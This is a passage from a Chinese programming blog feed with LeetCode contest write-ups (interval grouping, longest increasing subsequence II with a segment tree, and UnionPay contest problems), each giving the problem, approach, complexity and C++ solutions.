<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：intervals = [[5,10],[6,8],[1,5],[2,3],[1,10]]</span><br><span class="line">输出：3</span><br><span class="line">解释：我们可以将区间划分为如下的区间组：</span><br><span class="line">- 第 1 组：[1, 5] ，[6, 8] 。</span><br><span class="line">- 第 2 组：[2, 3] ，[5, 10] 。</span><br><span class="line">- 第 3 组：[1, 10] 。</span><br><span class="line">可以证明无法将区间划分为少于 3 个组。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：intervals = [[1,3],[5,6],[8,10],[11,13]]</span><br><span class="line">输出：1</span><br><span class="line">解释：所有区间互不相交，所以我们可以把它们全部放在一个组内。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= intervals.length &lt;= 105</code></li>
<li><code>intervals[i].length == 2</code></li>
<li><code>1 &lt;= lefti &lt;= righti &lt;= 106</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/divide-intervals-into-minimum-number-of-groups/">https://leetcode.cn/problems/divide-intervals-into-minimum-number-of-groups/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>查分数组
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>本体与某个 <code>CPU</code> 调度的题目基本上一模一样的原理，本质上就是求区间中最大的重叠次数即可，只需要求出最大重叠此时一定可以划分为不同的区间。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minGroups</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;</span><br><span class="line">        map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : intervals) &#123;</span><br><span class="line">            cnt[v[<span class="number">0</span>]]++;</span><br><span class="line">            cnt[v[<span class="number">1</span>] + <span class="number">1</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> curr = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [_, x] : cnt) &#123;</span><br><span class="line">            curr += x;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6206-最长递增子序列-II"><a href="#6206-最长递增子序列-II" class="headerlink" title="6206. 最长递增子序列 II"></a>6206. 最长递增子序列 II</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> 。</p>
<p>找到 <code>nums</code> 中满足以下要求的最长子序列：</p>
<ul>
<li>子序列 <strong>严格递增</strong></li>
<li>子序列中相邻元素的差值 <strong>不超过</strong> <code>k</code> 。</li>
</ul>
<p>请你返回满足上述要求的 <strong>最长子序列</strong> 的长度。</p>
<p><strong>子序列</strong> 是从一个数组中删除部分元素后，剩余元素不改变顺序得到的数组。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,2,1,4,3,4,5,8,15], k = 3</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">满足要求的最长子序列是 [1,3,4,5,8] 。</span><br><span class="line">子序列长度为 5 ，所以我们返回 5 。</span><br><span class="line">注意子序列 [1,3,4,5,8,15] 不满足要求，因为 15 - 8 = 7 大于 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [7,4,5,1,8,12,4,7], k = 5</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">满足要求的最长子序列是 [4,5,8,12] 。</span><br><span class="line">子序列长度为 4 ，所以我们返回 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,5], k = 1</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">满足要求的最长子序列是 [1] 。</span><br><span class="line">子序列长度为 1 ，所以我们返回 1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], k &lt;= 105</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/longest-increasing-subsequence-ii/">https://leetcode.cn/problems/longest-increasing-subsequence-ii/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>线段树模板</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的线段树模板，我们设 $dp[i]$ 表示以 $i$ 为结尾的元素所能构成最长子序列，对于当前的元素 $x$，我们需要查询以区间 $[x-k,x -1]$ 中的元素为结尾的最长递增子序列的长度，即我们需要查询 $dp[x-k, \cdots, x -1]$ 这样元素的最大值 $maxVal$，同时将 $dp[x] &#x3D; maxVal + 1$，可以得到递推公式如下:<br>$$<br>dp[x] &#x3D; \max_{j &#x3D; x - k}^{x-1} dp[j]<br>$$<br>所以很容易采用线段树来进行范围查询和范围更新，非常典型的线段树模板题目。方法二维动态开点的线段树模板。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log \max(nums))$，其中 $n$ 表示数组的长度，$\max(nums)$ 表示数组中的最大元素。</li>
<li>空间复杂度：$O(\max(nums))$，$\max(nums)$ 表示数组中的最大元素。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHL(x) (x * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHR(x) (x * 2 + 1)</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">4e5</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegTreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="type">int</span> maxVal;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SegTreeNode tree[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushUpTree</span><span class="params">(<span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    tree[idx].maxVal = <span class="built_in">max</span>(tree[<span class="built_in">CHL</span>(idx)].maxVal, tree[<span class="built_in">CHR</span>(idx)].maxVal);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">buildTree</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt; r) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">        tree[idx].l = tree[idx].r = l;</span><br><span class="line">        tree[idx].maxVal = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tree[idx].l = l;</span><br><span class="line">    tree[idx].r = r;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">buildTree</span>(<span class="built_in">CHL</span>(idx), l, mid);</span><br><span class="line">    <span class="built_in">buildTree</span>(<span class="built_in">CHR</span>(idx), mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">updateTree</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> val, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; tree[idx].l || x &gt; tree[idx].r) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == tree[idx].l &amp;&amp; x == tree[idx].r) &#123;</span><br><span class="line">        tree[idx].maxVal = val;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> mid = (tree[idx].l + tree[idx].r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= mid) &#123;</span><br><span class="line">        <span class="built_in">updateTree</span>(x, val, <span class="built_in">CHL</span>(idx));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">updateTree</span>(x, val, <span class="built_in">CHR</span>(idx));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">queryTree</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r &lt; tree[idx].l || l &gt; tree[idx].r) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= tree[idx].l &amp;&amp; r &gt;= tree[idx].r) &#123;</span><br><span class="line">        <span class="keyword">return</span> tree[idx].maxVal;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> mid = (tree[idx].l + tree[idx].r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (r &lt;= mid) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l, r, <span class="built_in">CHL</span>(idx));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l &gt; mid) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">queryTree</span>(l, mid, <span class="built_in">CHL</span>(idx)), <span class="built_in">queryTree</span>(mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxN = *<span class="built_in">max_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">buildTree</span>(<span class="number">1</span>, <span class="number">0</span>, maxN);</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : nums) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">queryTree</span>(<span class="built_in">max</span>(<span class="number">0</span>, x - k), x - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, len + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">updateTree</span>(x, len + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> val, <span class="type">int</span> idx, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; l || x &gt; r) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == r &amp;&amp; l == x) &#123;</span><br><span class="line">            tree[idx] = val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt;= mid) &#123;</span><br><span class="line">            <span class="built_in">update</span>(x, val, idx * <span class="number">2</span>, l, mid);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">update</span>(x, val, idx * <span class="number">2</span> + <span class="number">1</span>, mid + <span class="number">1</span>, r);</span><br><span class="line">        &#125;</span><br><span class="line">        tree[idx] = <span class="built_in">max</span>(tree[idx * <span class="number">2</span>], tree[idx * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> idx, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left &gt; r || right &lt; l) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (left &lt;= l &amp;&amp; r &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">return</span> tree[idx];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt;= mid) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(left, right, idx * <span class="number">2</span>, l, mid);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left &gt; mid) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(left, right, idx * <span class="number">2</span> + <span class="number">1</span>, mid + <span class="number">1</span>, r);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">query</span>(left, mid, idx * <span class="number">2</span>, l, mid), \</span><br><span class="line">                       <span class="built_in">query</span>(mid + <span class="number">1</span>, right, idx * <span class="number">2</span> + <span class="number">1</span>, mid + <span class="number">1</span>, r));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxNum = *<span class="built_in">max_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : nums) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">query</span>(<span class="built_in">max</span>(<span class="number">0</span>, x - k), x - <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, maxNum);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, len + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">update</span>(x, len + <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, maxNum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; tree;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>中国银联专场竞赛（2023届校园招聘专场）</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/34/</url>
    <content><![CDATA[<h2 id="中国银联专场竞赛（2023届校园招聘专场）"><a href="#中国银联专场竞赛（2023届校园招聘专场）" class="headerlink" title="中国银联专场竞赛（2023届校园招聘专场）"></a>中国银联专场竞赛（2023届校园招聘专场）</h2><p>这个专场赛的题目不咋的，全都是业务逻辑的题目，少了些思考性的题目。</p>
<h4 id="银联-1-重构链表"><a href="#银联-1-重构链表" class="headerlink" title="银联-1. 重构链表"></a>银联-1. 重构链表</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给定一个链表的头节点 <code>head</code> ，在不改变节点顺序的基础下，请删除链表中所有值为 <code>偶数</code> 的节点，并返回这个链表 。</p>
<p><strong>注意：</strong></p>
<ul>
<li>若链表为空，则返回空值。</li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<code>head = [1,4,3,6]</code></p>
<p>输出：<code>[1,3]</code></p>
<p>解释：如下图所示，黑色节点的值均为偶数，删除这些节点后，链表为 <code>[1,3]</code><br><img src="https://pic.leetcode-cn.com/1663123060-ffBMiH-image.png" alt="image.png"></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<code>head = [5,7,9,9,1]</code></p>
<p>输出：<code>[5,7,9,9,1]</code></p>
<p>解释：原链表中不存在值为偶数的节点。</p>
</blockquote>
<p><strong>示例 3：</strong></p>
<blockquote>
<p>输入：<code>head = [2,4]</code></p>
<p>输出：<code>[]</code></p>
<p>解释：原链表中所有节点值均为偶数。</p>
</blockquote>
<p><strong>提示：</strong><br><code>1 &lt;= head.length &lt;= 10^5</code><br><code>0 &lt;= Node.val &lt;= 100</code></p>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/VLNEbD/">https://leetcode.cn/contest/cnunionpay2022/problems/VLNEbD/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>链表
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计偶数元素，然后重建链表即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示链表的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示链表的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reContruct</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">while</span>(head) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head-&gt;val &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(head-&gt;val);</span><br><span class="line">            &#125;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        head = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *curr = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">                head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(arr[i]);</span><br><span class="line">                curr = head;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                curr-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(arr[i]);</span><br><span class="line">                curr = curr-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="银联-2-勘探补给"><a href="#银联-2-勘探补给" class="headerlink" title="银联-2. 勘探补给"></a>银联-2. 勘探补给</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>工程部在一条坐标轴上设立了若干补给站，<code>station[i]</code> 表示编号为 <code>i</code> 的补给站的坐标。</p>
<p>现在有一些正在执行任务的勘探队需要进行补给，<code>pos[i]</code> 表示第 <code>i</code> 个勘探队当前所在位置的坐标。勘探队将优先选择<strong>当前距离最近</strong>的补给站进行补给。若两座补给站距离相同，则选择坐标更小的那一个。</p>
<p><strong>请按顺序</strong>返回这些勘探队所选择的补给站编号。</p>
<p><strong>注意：</strong></p>
<ul>
<li><code>station</code> 中的元素严格递增，即 <code>station[i] &lt; station[i+1]</code></li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>station = [2,7,8,10]</code><br><code>pos = [4,9]</code><br>输出：<br><code>[0,2]</code><br>解释：<br>坐标 <code>4</code> 的勘探队与坐标为 <code>2</code> 和 <code>7</code> 的补给站距离分别为 <code>2</code> 和 <code>3</code>， 选择坐标为 <code>2</code>的补给站<br>坐标 <code>9</code> 的勘探队与坐标为 <code>8</code> 和 <code>10</code> 的补给站的距离均为 <code>1</code>， 选择坐标更小为 <code>8</code> 的补给站<br>返回编号为 <code>[0,2]</code> 的补给站。</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>station = [2,5,8,14,17]</code><br><code>pos = [1,14,11,2]</code><br>输出：<br><code>[0,3,2,0]</code></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= pos.length,station.length &lt;= 10^4</code></li>
<li><code>1 &lt;= pos[i] &lt;= 10^6</code></li>
<li><code>1 &lt;= station[i] &lt; station[i+1] &lt;= 10^6</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/">https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>双指针或者二分查找
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>几乎是模板题目了，感觉直接二分查找即可，找到距离每个 <code>pos</code> 最近的 <code>station</code> 即可，非常简单的二分查找。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m \log n)$，$m,n$ 表示 <code>pos, station</code> 的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$，除返回值外不需要额外的空间。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">explorationSupply</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; station, vector&lt;<span class="type">int</span>&gt;&amp; pos)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = station.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = pos.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(station.<span class="built_in">begin</span>(), station.<span class="built_in">end</span>(), pos[i]);</span><br><span class="line">            <span class="keyword">if</span> (it == station.<span class="built_in">begin</span>()) &#123;</span><br><span class="line">                ans[i] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (it == station.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                ans[i] = n - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> x = it - station.<span class="built_in">begin</span>();</span><br><span class="line">                <span class="keyword">if</span> (pos[i] - station[x<span class="number">-1</span>] &lt;= station[x] - pos[i]) &#123;</span><br><span class="line">                    ans[i] = x - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ans[i] = x;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="银联-3-风能发电"><a href="#银联-3-风能发电" class="headerlink" title="银联-3. 风能发电"></a>银联-3. 风能发电</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>现有一座风力发电场和<strong>容量</strong> <code>storeLimit</code> 的储能站，第 <code>j</code> 条供电指令 <code>supply[j]=[time, minSupply, maxSupply]</code> 表示时刻 <code>time</code> 起（包含该时刻）每一时刻最少供应电能 <code>minSupply</code> 以及最多供应电能 <code>maxSupply</code>，直至后续指令调整。</p>
<p>在时刻 <code>i</code> 发电量为 <code>power[i]</code>，该时刻供电逻辑如下：</p>
<ul>
<li><p>若发电量在 <code>[minSupply, maxSupply]</code> 范围内，则均供应负载；</p>
</li>
<li><p>若发电量大于 <code>maxSupply</code>，则超出部分存入储能站，存储量至多不超过 <code>storeLimit</code>；</p>
</li>
<li><p>若发电量小于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">minSupply</span><br></pre></td></tr></table></figure>

<p>，则由储能站补充缺少电量，最多不超过当前存储量；</p>
<blockquote>
<p>注：储能站补充电量，直至剩余存储电量为 <code>0</code></p>
</blockquote>
</li>
</ul>
<p>请返回最后时刻（即时刻 <code>power.length-1</code>）储能站中能源总量。</p>
<p><strong>注意：</strong></p>
<ul>
<li>输入用例保证供电指令的 <code>time</code> 严格递增且第 <code>0</code> 个指令的 <code>time = 0</code></li>
<li>储能电站初始存储电量为 <code>0</code></li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>storeLimit = 10</code><br><code>power = [1,3,4,3,6]</code><br><code>supply = [[0,2,3]]</code></p>
<p>输出: <code>4</code></p>
<p>解释：<br>时刻 0，供能 1， 新增储能 0， 总储能 0<br>时刻 1，供能 3， 新增储能 0， 总储能 0<br>时刻 2，供能 3， 新增储能 1， 总储能 1<br>时刻 3，供能 3， 新增储能 0， 总储能 1<br>时刻 4，供能 3， 新增储能 3， 总储能 4<br>因此最后时刻，剩余的能源总量为 4</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>storeLimit = 6</code><br><code>power = [6,5,2,1,0]</code><br><code>supply = [[0,1,2],[2,3,3]]</code></p>
<p>输出: <code>0</code></p>
<p>解释：<br>时刻 0，供能 2， 新增储能 4， 总储能 4<br>时刻 1，供能 2， 新增储能 2， 总储能 6 (由于储能电站达上限，电量 1 丢弃)<br>时刻 2，供能 3， 新增储能 -1， 总储能 5<br>时刻 3，供能 3， 新增储能 -2， 总储能 3<br>时刻 4，供能 3， 新增储能 -3， 总储能 0<br>因此最后时刻，剩余的能源总量为 0</p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
